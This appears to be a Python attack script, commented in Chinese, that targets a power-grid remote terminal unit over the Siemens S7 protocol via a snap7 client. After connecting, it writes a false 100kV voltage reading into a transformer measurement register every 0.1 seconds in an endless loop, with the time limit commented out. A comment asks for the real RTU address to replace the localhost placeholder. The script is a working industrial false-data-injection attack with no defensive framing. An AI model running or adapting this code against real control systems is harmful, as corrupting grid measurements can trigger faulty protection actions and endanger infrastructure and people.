#-----------------------------------------------------------------------------
# 攻击循环示例
import time
import snap7Comm

# 配置参数
RTU_IP = '127.0.0.1'  # 将此IP更改为电网RTU02的实际IP
RTU_PORT = 102
LIB_PATH = ''  # 替换为实际的snap7库路径
INT_TYPE = 2  # 假设2代表整数类型，根据实际库定义调整
ATTACK_DURATION = 20

# 初始化客户端
client = snap7Comm.s7CommClient(
    RTU_IP,
    rtuPort=RTU_PORT,
    snapLibPath=LIB_PATH
)

# 建立连接
connection = client.checkConn()

count =0

if connection:
    time.sleep(5)  # 添加的5秒休眠
    start_time = time.time()  # 记录攻击开始时间
    while True:
        # if time.time() - start_time > ATTACK_DURATION:
        #     print("攻击已持续10秒，自动断开连接！")
        #     break
        print("Attack: Start inject out of MU measurement range false voltrage value (100kV) \nto lvl0 Transformer RTU-MU reading")
        client.setAddressVal(7, 4, 100, dataType=INT_TYPE)
        time.sleep(0.1)
        print("False data Inject finished!")

